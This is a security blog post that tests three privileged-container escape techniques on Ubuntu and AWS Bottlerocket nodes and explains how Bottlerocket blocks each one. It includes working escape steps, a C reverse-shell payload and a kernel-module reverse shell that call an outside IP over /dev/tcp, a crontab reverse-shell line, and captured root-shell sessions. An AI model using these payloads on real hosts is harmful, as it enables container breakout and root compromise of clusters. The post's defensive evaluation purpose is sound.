---
date:
  created: 2025-12-10
# categories:
#   - AWS
#   - EKS
#   - kubernetes
authors:
  - terryf82
slug: blog/hands-on-with-aws-bottlerocket
title: "Hands On with AWS Bottlerocket: Evaluating the Security of Amazon's Hardened OS"
summary: "AWS Bottlerocket is well-known as a secure, minimalist operating system, often used to provide a reliable container hosting environment through enhanced security features and reduced attack surface. But how does it actually work when faced with common container escape techniques? Read on to find out!"
social:
  cards:
    image: ../assets/images/post2.png
---

# Hands On with AWS Bottlerocket: Evaluating the Security of Amazon's Hardened OS

*AWS Bottlerocket is well-known as a secure, minimalist operating system, often used to provide a reliable container hosting environment through enhanced security features and reduced attack surface. But how does it actually work when faced with common container escape techniques? Read on to find out!*

![Hands On with AWS Bottlerocket: Evaluating the Security of Amazon's Hardened OS](../assets/images/post2.png)

<!-- more -->

## Introduction
When it comes to deciding how to configure a kubernetes cluster, choosing an operating system for the worker nodes isn't always the first thing that comes to mind. Often, users will simply go with their chosen cloud provider's default offering (*Amazon Linux* for AWS, *Container-Optimized OS* for GCP, *Azure Linux* for.. Azure). Others will opt for an OS they might be familiar with, such as Ubuntu Linux, out of a desire for familiarity - should there be a need to interact with the nodes for troubleshooting purposes, knowing where to look for certain log files, or how to install and run common debugging utilities, can be a big help when trying to resolve problems.

For those seeking to maximise the security of their cluster, however, AWS Bottlerocket should definitely be considered. First released in 2020, the project aims to provide a reliable and highly secure opearting system, by employing a number of complimentary features:

1. a read-only root filesystem via the *dm-verity* kernel module, that provides transparent integrity checking of the block device using a cryptographic hash tree. Any change to the hash will lead to the kernel detecting corruption, triggering an immediate reboot

2. an always-enabled and enforced, restrictive *SELinux* policy, for the parts of the filesystem that are mutable. When used as a worker node OS, this helps prevent containers from executing dangerous operations on the host and each other, even when they run as root

3. no command shell, package manager or language interpreters are installed. OS updates are managed by a utility known as *TUF (The Update Framework)*, which delivers atomic, cryptographically-signed update images, as well as blocking malicious rollback attacks and the use of compromised repository keys. Administration tasks are carried out using two purpose-built containers: the *control container* intended for standard management tasks, and the *admin container* for high-privilege & emergency tasks. These are both run by a completely separate instance of the container runtime (*containerd*) to that which runs applications and workloads in a cluster, further enhancing security

4. ephemeral, template-rendered system configuration files, such as those residing in `/etc`. The settings for these files are actually retrieved from an internal Bottlerocket API, helping to block common methods of persistence, e.g malicious *cron* entries

5. kernel lockdown via *integrity mode*, that prevents an attacker with sufficient privileges from loading unsigned kernel modules

6. *confidentiality mode* which takes *integrity mode* one step further, by preventing an attacker from also reading any of the kernel's memory from userspace

## The Premise
While the [official documentation](https://aws.amazon.com/bottlerocket/) from AWS does a good job of providing a high-level overview of how these security features work, I typically find it much more instructive to get hands-on with this kind of thing and test out some actual attack paths, in order to better understand how the defence mechanisms work. In that spirit, this post aims to provide a short overview of how Bottlerocket is able to defeat three well-established container escape techniques, while a less-hardened OS (Ubuntu default install, in this case) may fail.

To be clear, none of the container escape techniques listed here are novel, and they all depend on the ill advised (yet still common) practice of running containers in *privileged mode*. A [lot](https://www.trendmicro.com/en_us/research/19/l/why-running-a-privileged-container-in-docker-is-a-bad-idea.html) has [already](https://learn.snyk.io/lesson/container-runs-in-privileged-mode/?ecosystem=kubernetes) been [written](https://cloudnativenow.com/topics/cloudnativesecurity/why-running-a-privileged-container-is-not-a-good-idea/) about this subject and while most people know it's a bad idea, the pressure to deploy a new release on a tight schedule or get some new application feature working means that it still happens. *Not falling into the trap of deploying containers in privileged mode is one of the most beneficial security practices you can implement.*

With that out of the way, let's deploy some containers and start escaping!

## Technique 1: Abusing the Kernel Usermode Helper by Triggering a Coredump
As outlined in [this research paper from pwning.systems](https://pwning.systems/posts/escaping-containers-for-fun/), containers running in privileged mode can be escaped by abusing the kernel usermode helper. This attack involves configuring a malicious binary that will be run on the host (as root) when a coredump occurs inside the container, something that can easily be achieved.

The first step is to craft a payload to be run on the host. Some common examples for Linux-based environments include:

- adding a new ssh key to `/root/.ssh/authorized_keys`
- copying or modifying `/etc/passwd` or `/etc/shadow` (or any other system config file)
- triggering a reverse shell via `bash`, `python3`, `nc` etc.

For this demonstration our payload will be a simple reverse shell one-liner, that connects out to a netcat listener on a waiting AWS EC2 (with the assumed IP `15.230.15.77`). Written in C, the source for the payload is straightforward:
```
// payload.c
#include <stdlib.h>

int main() {
  const char *cmd = "bash -i >& /dev/tcp/15.230.15.77/4444 0>&1";
  system(cmd);
  return 0;
}
```

Once compiled via `gcc -o payload payload.c`, the next task is to identify where the `payload` binary actually exists, but on the host's filesystem. Container runtimes typically use *overlayfs* or similar to provide containers with what appears to be dedicated, isolated storage space, but in reality is just a folder stored on the node's filesystem. The path to this folder on the node can be retrieved by running `mount` and looking for the `upperdir` value:
```
root@priv-app-ubuntu:/# mount
overlay on / type overlay (rw,relatime,seclabel,lowerdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/178/fs,upperdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/183/fs,workdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/183/work,uuid=on)
...
```

To prime the attack, we set the value of `/proc/sys/kernel/core_pattern` to the payload at the *upperdir* path, prefixed with a `|` character. As outlined in the research paper, this has the effect of the value being interpreted as a command to run in the event of a coredump:
```
echo "|/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/183/fs/payload" > /proc/sys/kernel/core_pattern
```

From this point, we simply need to trigger a coredump in the container. This can be achieved in a number of ways, one of which is by running some deliberately broken C code that dereferences a null pointer:
```
// trigger.c
#include <stdio.h>

int main() {
    int *ptr = NULL;
    *ptr = 10;

    return 0;
}
```

From a container running on a Ubuntu-based node, compiling and running the trigger causes a coredump as expected:
```
root@priv-app-ubuntu:/# gcc -o trigger trigger.c
root@priv-app-ubuntu:/# ./trigger
Segmentation fault (core dumped)
```

which in turn leads to a root-level reverse shell from the node being caught on the waiting EC2 💀
```
[ec2-user@ip-10-240-150-240 tmp]$ nc -lvnp 4444
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 51.26.193.49.
Ncat: Connection from 51.26.193.49:18796.
sh: cannot set terminal process group (-1): Inappropriate ioctl for device
sh: no job control in this shell
sh-5.2# whoami
whoami
root
```

How might the situation change if the container was running on a Bottlerocket node? Using the same privileged setup, an attacker running loose inside the container can still perform the necessary setup steps listed above (retrieve the `upperdir` value using `mount`, compile a payload and set `/proc/sys/kernel/core_pattern`, then trigger a coredump inside the container):

```
root@priv-app-bottlerocket:/# ./trigger
Segmentation fault
```

However this time, the waiting reverse shell listener remains unanswered:
```
[ec2-user@ip-10-240-150-240 tmp]$ nc -lvnp 4444
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
...
```

What happened? As explained in the intro, Bottlerocket runs with SELinux enabled, a kernel security module that enforces mandatory access control via a labelling system. This prevents processes in a container from running in unexpected places, such as the host or another container. The node's system log confirms that SELinux has blocked execution of the malicious payload as intended:
```
...
AVC avc:  denied  { execute_no_trans } for  pid=6151 comm="kworker/u4:4" path="/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/62/fs/payload" dev="nvme1n1p1" ino=17707920 scontext=system_u:system_r:kernel_t:s0 tcontext=system_u:object_r:data_t:s0:c665,c750 tclass=file permissive=0
```

The `payload` binary has been labelled with `data_t`, indicating that it must never be executed. Additionally, the kernel thread attempted execution without proper domain transition, which is disallowed by SELinux policy.

**Bonus Features!**


Could we have gotten further if SELinux hadn't blocked the payload execution? Not likely, since Bottlerocket implements layers of protection that make typical reverse shell payloads unusable. For example, take a look at what the default shell on a Bottlerocket node actually links to:

```
bash-5.1# ls -l /bin/sh
lrwxrwxrwx. 1 root root 5 Sep 12 03:30 /bin/sh -> brush
```

`brush` is a nonstandard, restricted command runner, that doesn't implement typical interactive behaviour or shell redirection features. Essentially it's a minimalist interface to the Bottlerocket API client, meaning it doesn't have the bash-like features needed to establish the connection to our waiting listener. In a typical Linux environment, there are usually plenty of alternative ways to establish a reverse-shell - [revshells.com](https://revshells.com) lists several:

- `nc`
- `busybox`
- `perl`
- `python3`
- `php`
- `ruby`
- ...

Unsurprisingly, none of these are present inside of Bottlerocket. By design, the OS comes with no (usable) shell, package manager or language interpreters - just a minimal container runtime 🚀

## Technique 2: Mounting the Host Filesystem
Another common technique for escaping from a container is to access the host's filesystem, by simply mounting the relevant block device and make the contents available through the container's filesystem. Again, this escape relies on the fact that privileged mode disables a number of key security controls:

1. the device cgroup controller's limitations that prevent processes inside the container interacting with host's block devices are lifted
2. the `cap_sys_admin` capability is enabled, allowing for the running of the `mount` command

Executing this attack from a container hosted on a Ubuntu-based node is straightforward:

1. list the available block devices via `lsblk`:
```
root@app-priv-ubuntu:/# lsblk
NAME         MAJ:MIN RM  SIZE RO TYPE MOUNTPOINTS
loop0          7:0    0   24M  1 loop
loop1          7:1    0 49.6M  1 loop
loop2          7:2    0 68.9M  1 loop
loop3          7:3    0 59.6M  1 loop
loop4          7:4    0  4.8M  1 loop
loop5          7:5    0 11.5M  1 loop
loop6          7:6    0 15.3M  1 loop
loop7          7:7    0 44.2M  1 loop
nvme0n1      259:0    0   20G  0 disk
|-nvme0n1p1  259:2    0   19G  0 part /etc/resolv.conf
|                                     /etc/hostname
|                                     /dev/termination-log
|                                     /etc/hosts
|-nvme0n1p15 259:3    0   99M  0 part
`-nvme0n1p16 259:4    0  923M  0 part
nvme1n1      259:1    0   20G  0 disk
```

2. mount the host's underyling partition, using its retrieved device name:
```
root@app-priv-ubuntu:/# mount /dev/nvme0n1p1 /mnt
```

3. access the host's entire filesystem via the `/mnt` directory:
```
root@app-priv-ubuntu:/# ls -la /mnt
total 104
drwxr-xr-x 23 root root  4096 Oct 15 04:29 .
drwxr-xr-x  1 root root  4096 Oct 15 04:29 ..
lrwxrwxrwx  1 root root     7 Apr 22  2024 bin -> usr/bin
drwxr-xr-x  2 root root  4096 Feb 26  2024 bin.usr-is-merged
drwxr-xr-x  2 root root  4096 Oct  1 12:43 boot
drwxr-xr-x  4 root root  4096 Oct  1 12:34 dev
drwxr-xr-x 83 root root  4096 Oct 15 04:35 etc
drwxr-xr-x  4 root root  4096 Oct 15 04:35 home
drwxr-xr-x  3 root root  4096 Oct 15 04:29 host
lrwxrwxrwx  1 root root     7 Apr 22  2024 lib -> usr/lib
drwxr-xr-x  2 root root  4096 Feb 26  2024 lib.usr-is-merged
drwx------  2 root root 16384 Oct  1 12:42 lost+found
drwxr-xr-x  2 root root  4096 Oct  1 12:34 media
drwxr-xr-x  2 root root  4096 Oct  1 12:34 mnt
drwxr-xr-x  5 root root  4096 Oct 15 04:29 opt
drwxr-xr-x  2 root root  4096 Apr 22  2024 proc
drwx------  5 root root  4096 Oct 15 04:29 root
drwxr-xr-x  5 root root  4096 Oct  1 12:54 run
lrwxrwxrwx  1 root root     8 Apr 22  2024 sbin -> usr/sbin
drwxr-xr-x  2 root root  4096 Jul 10 14:46 sbin.usr-is-merged
drwxr-xr-x 11 root root  4096 Oct  1 12:54 snap
drwxr-xr-x  2 root root  4096 Oct  1 12:34 srv
drwxr-xr-x  2 root root  4096 Apr 22  2024 sys
drwxrwxrwt 10 root root  4096 Oct 15 04:37 tmp
drwxr-xr-x 11 root root  4096 Oct  1 12:34 usr
drwxr-xr-x 13 root root  4096 Oct 15 04:28 var
```

There are many potential pathways forward from this point. If the host was running ssh, an attacker could pivot to that by reading or modifying the `/etc/passwd` and `/etc/shadow` files. This would allow them to retrieve encrypted user passwords for offline cracking, change existing passwords and even add completely new users. Another option would be to insert a new ssh key directly into a user's `~/.ssh/authorized_keys` file, allowing them to login without knowing the user's existing password. If `cron` happened to be running on the host, a basic reverse shell that calls out every minute could also be added to the `/etc/crontab` file, like so:
```
echo "* * * * * root /bin/bash -c '/bin/bash -i >& /dev/tcp/15.230.15.77/4444 0>&1'" >> /mnt/etc/crontab
```

As soon as the `cron` daemon reloads, a root-level shell will be caught by the waiting listener, providing the attacker with shell access to the node 💀
```
[ec2-user@ip-10-240-150-240 ~]$ nc -lvnp 4444
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.248.2.145.
Ncat: Connection from 10.248.2.145:42052.
bash: cannot set terminal process group (13006): Inappropriate ioctl for device
bash: no job control in this shell
root@ip-10-248-2-145:~# whoami
whoami
root
```

What happens when we move to a Bottlerocket node? To start with, `lsblk` shows us a somewhat different looking list of devices available:
```
root@app-priv-bottlerocket:/# lsblk
NAME         MAJ:MIN RM  SIZE RO TYPE MOUNTPOINTS
nvme0n1      259:0    0    4G  0 disk
|-nvme0n1p1  259:2    0    4M  0 part
|-nvme0n1p2  259:3    0    5M  0 part
|-nvme0n1p3  259:4    0   40M  0 part
|-nvme0n1p4  259:5    0  920M  0 part
|-nvme0n1p5  259:6    0   10M  0 part
|-nvme0n1p6  259:7    0   25M  0 part
|-nvme0n1p7  259:8    0    5M  0 part
|-nvme0n1p8  259:9    0   40M  0 part
|-nvme0n1p9  259:10   0  920M  0 part
|-nvme0n1p10 259:11   0   10M  0 part
|-nvme0n1p11 259:12   0   25M  0 part
|-nvme0n1p12 259:13   0   41M  0 part
`-nvme0n1p13 259:14   0    1M  0 part
nvme1n1      259:1    0   20G  0 disk
`-nvme1n1p1  259:16   0   20G  0 part /etc/resolv.conf
                                      /etc/hostname
                                      /dev/termination-log
                                      /etc/hosts
```

What's going on here? As mentioned earlier, Bottlerocket implements a dual-partition, immutable root filesystem approach:

1. a comparatively small read-only **root filesystem** available at `/dev/nvme0n1p1`
2. a typically larger **data partition** available at `/dev/nvme1n1p1`, intended to store persistent data and container state

Attempting to mount the root filesystem is no longer possible:
```
root@app-priv-bottlerocket:/# mount /dev/nvme0n1p1 /mnt
mount: /mnt: wrong fs type, bad option, bad superblock on /dev/nvme0n1p1, missing codepage or helper program, or other error.
       dmesg(1) may have more information after failed mount system call.
```

The `dmesg` output confirms this is the case:
```
[ 4521.901135] erofs: (device nvme0n1p1): erofs_read_superblock: cannot find valid erofs superblock
```

Bottlerocket protects this partition using `dm-verity`, a kernel feature designed to verify the integrity of read-only partitions. In addition to blocking any attempts to modify the filesystem, the way it is mounted to the node also prevents the partition from being re-mounted into the container, even if it happens to be running in privileged mode.

This protection doesn't extend to the data partition however, which can still be mounted from the container:

```
root@app-priv-bottlerocket:/# mount /dev/nvme1n1p1 /mnt
```

But when we list the contents of the drive, the results aren't quite what might be expected:
```
root@app-priv-bottlerocket:/# ls -la /mnt
total 0
drwxr-xr-x. 7 root root 90 Oct 15 04:40 .
drwxr-xr-x. 1 root root 28 Oct 15 04:41 ..
drwx------. 2 root root  6 Oct 15 04:40 bootstrap-containers
drwx------. 4 root root 34 Oct 15 04:40 host-containers
drwxr-xr-x. 2 root root  6 Oct 15 04:40 mnt
drwxr-xr-x. 4 root root 53 Oct 15 04:40 opt
drwxr-xr-x. 7 root root 88 Oct 15 04:40 var
```

As well as running with dual partitions, Bottlerocket also maintains two separate container runtimes:

1. the `host container` runtime, which supports the privileged `control` and `admin` containers, intended to manage the host
2. the `application container` runtime, which supports containers deployed via kubernetes

The data partition exists primarily to support the host container runtime, indicated by the presence of the `/host-containers` directory. Due to the need for running services such as `kubelet` and `containerd`, it also indirectly supports the application container runtime. To be fair, the `/var/lib` directory could provide sensitive information related to other containers executing alongside our privileged container, which an attacker would no doubt be interested in. For example, assuming an adjacent container was running with a poorly configured credential, provided via a simple environment variable:
```
- name: PASSWORD
  value: supersecret
```

That container could have its credential leaked, through various container runtime configuration files found in `/var/lib`:
```
root@app-priv-bottlerocket:/mnt# grep -ri supersecret ./* 2>/dev/null
./var/lib/cni/results/cni-loopback-bb027bf6a87deee6b0f1f4a19efc6e84978f9258e08f08d0e50e772e6518d851-lo:{"kind":"cniCacheV1","containerId":"bb027bf6a87deee6b0f1f4a19efc6e84978f9258e08f08d0e50e772e6518d851","config":"ewoiY25pVmVyc2lvbiI6ICIwLjMuMSIsCiJuYW1lIjogImNuaS1sb29wYmFjayIsCiJwbHVnaW5zIjogW3sKICAidHlwZSI6ICJsb29wYmFjayIKfV0KfQ=="..."kubectl.kubernetes.io/last-applied-configuration":"{\"apiVersion\":\"v1\",\"kind\":\"Pod\",\"metadata\":{\"annotations\":{},\"name\":\"reg-pod-bottlerocket-host\",\"namespace\":\"default\"},\"spec\":{\"containers\":[{\"command\":[\"tail\",\"-f\",\"/dev/null\"],\"env\":[{\"name\":\"PASSWORD\",\"value\":\"supersecret\"}],\"image\":\"ubuntu:latest\",\"name\":\"ubuntu\"}],\"nodeSelector\":{\"nodepool\":\"arm-bottlerocket\"}...
```

In terms of looking for ways to gain shell access to the node however, Bottlerocket's dual-partition approach limits our options:

- there is no direct access to sensitive system files like we had on the Ubuntu host (`/etc/*`, users' `~/.ssh/authorized_keys` etc)
- some of these system files do still exist, but accessing them requires first entering the *admin container*, before using `sheltie` to transition the working context to the host, which finally provides access to the host's filesystem

Browsing the files that we *do* have access to, you may feel a shiver of hope when viewing the contents of `/host-containers/admin/user-data`:
```
root@app-priv-bottlerocket:/# cat /mnt/host-containers/admin/user-data
{"ssh":{"authorized-keys":[]}}
```

Like other EC2s, Bottlerocket supports provisioning user-data for bootstrapping. What makes it different, however, is the way that this user-data is applied. The file in question is actually mounted into the `admin` container on startup, rather than being applied to the host. At first glance it may appear that our write access to this file could provide a way of adding an ssh key to the admin container, and while the file is actually editable from the privileged container, modifying it has no effect. This is because changing the admin container's behaviour requires execution of the native *Bottlerocket API*, which remains out of reach without shell access to the host.

In summary, Bottlerocket's dual-partition setup prevents us from getting anywhere near the meaningful files of the host's filesystem, and its read-only setup means that even if we could, it wouldn't prove very useful anyway 🚀

## Technique 3: Loading a Custom Kernel Module
The final container escape technique evaluated involves the loading of a malicious, custom kernel module, initiated from within the privileged container but ultimately impacting the host. There is a common misconception that traditional container runtimes provide a strong security boundary between containers, when in reality they're all just processes running on the host (projects such as [Kata Containers](https://katacontainers.io/) are seeking to address this). The only operating system kernel at work is usually the one belonging to the host, which it shares with the running containers, meaning any code executed inside those containers is actually executed on the host. Again, this kind of attack is only possible due to the container being launched in privilege mode, which provides it with the `CAP_SYS_MODULE` capability.

To execute the attack, a compatible kernel module that contains the payload needs to be prepared for the container. This can be compiled directly in the container if the required tools are available, or it can be prepared elsewhere and copied over. [RBT Security](https://www.rbtsec.com/blog/kubernetes-penetration-testing-part-three-breaking-out-with-privileged-containers/) have a great blog post oulining the process, including sample source code for the module:

```
# Makefile
obj-m += k8s-lkm-reverse-shell.o
KDIR := /lib/modules/$(shell uname -r)/build
PWD  := $(shell pwd)
all:
	$(MAKE) -C $(KDIR) M=$(PWD) modules
clean:
	$(MAKE) -C $(KDIR) M=$(PWD) clean
```

```
// k8s-lkm-reverse-shell.c
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kmod.h>
#include <linux/workqueue.h>
#include <linux/slab.h>
#define REVERSE_SHELL_CMD \
    "bash -i >& /dev/tcp/15.230.15.77/4444 0>&1"
/* Will hold our dynamically-allocated command string */
static char *cmd_buf;
/* argv and envp for call_usermodehelper */
static char *argv_local[4];
static char *envp_local[] = {
    "HOME=/",
    NULL
};
/* Work item to defer our userspace call */
static DECLARE_WORK(cb_work, NULL);
/* Work handler - runs in process context, outside of module init */
static void cb_work_handler(struct work_struct *work)
{
    pr_info("cb_work_handler: launching reverse shell\n");
    call_usermodehelper(argv_local[0], argv_local, envp_local, UMH_NO_WAIT);
}
static int __init connect_back_init(void)
{
    /* 1) Allocate & copy the command into kernel memory */
    cmd_buf = kmalloc(strlen(REVERSE_SHELL_CMD) + 1, GFP_KERNEL);
    if (!cmd_buf)
        return -ENOMEM;
    strcpy(cmd_buf, REVERSE_SHELL_CMD);
    /* 2) Populate argv */
    argv_local[0] = "/bin/bash";
    argv_local[1] = "-c";
    argv_local[2] = cmd_buf;
    argv_local[3] = NULL;
    /* 3) Initialize and schedule our work item */
    INIT_WORK(&cb_work, cb_work_handler);
    schedule_work(&cb_work);
    pr_info("connect_back: module loaded, work scheduled\n");
    return 0;
}
static void __exit connect_back_exit(void)
{
    /* Ensure any pending work has finished */
    flush_work(&cb_work);
    /* Free our command buffer */
    kfree(cmd_buf);
    pr_info("connect_back: module exiting\n");
}
module_init(connect_back_init);
module_exit(connect_back_exit);
MODULE_LICENSE("GPL");
MODULE_AUTHOR("RBT Security");
MODULE_DESCRIPTION("Deferred reverse‐shell via privileged container escape PoC");
```

Beginning as usual with our Ubuntu-hosted container, we compile the code and run `insmod` to load it into the kernel:
```
root@app-priv-ubuntu:/lkm# make clean && make
root@app-priv-ubuntu:/lkm# insmod k8s-lkm-reverse-shell.ko
root@app-priv-ubuntu:/lkm#
```

The module loads cleanly thanks to the `CAP_SYS_MODULE` capability, and the netcat listener on our waiting EC2 receives a callback 💀
```
sh-5.2$ nc -lvnp 4444
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 51.26.193.49.
Ncat: Connection from 51.26.193.49:25716.
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
root@ip-10-248-4-218:/# whoami
whoami
root
```

With very little effort, we now have root-level access to the container's host. Trying to load the `k8s-lkm-reverse-shell.ko` in a container running on our Bottlerocket node, however, results in yet another brick wall:
```
root@app-priv-bottlerocket:/lkm# insmod k8s-lkm-reverse-shell.ko
insmod: ERROR: could not insert module k8s-lkm-reverse-shell.ko: Operation not permitted
```

The culprit this time is Bottlerocket's *kernel integrity* mode, which prevents the loading of unsigned kernel modules and only permits those included in the Bottlerocket image. Interestingly, this feature was apparently disabled by default in earlier [Bottlerocket variants](https://bottlerocket.dev/en/os/1.51.x/concepts/variants/), but is now generally enabled by default, blocking yet another avenue of attack 🚀

## Conclusion
As pointed out at the beginning of this article, none of these container escape techniques are new, nor do they rely on any kind of CVE or exploit. All three are only possible when containers are deployed using a feature that countless resources point out should not be used - yet it still is. While Bottlerocket can block the types of attack demonstrated, that *shouldn't* be interpreted as an endorsement to use it in the hope of running privileged containers 'safely'. *The use of privileged containers should be avoided at all costs.*

What it does show is that Bottlerocket has been designed with a defence-in-depth strategy, for which the developers should be commended. It both enhances security and at the same time minimises the attack surface. As a container host it provides a foundational pillar for building secure environments, that ideally implement both solid technical controls, and enforce sensible policies that govern how workloads can be deployed.
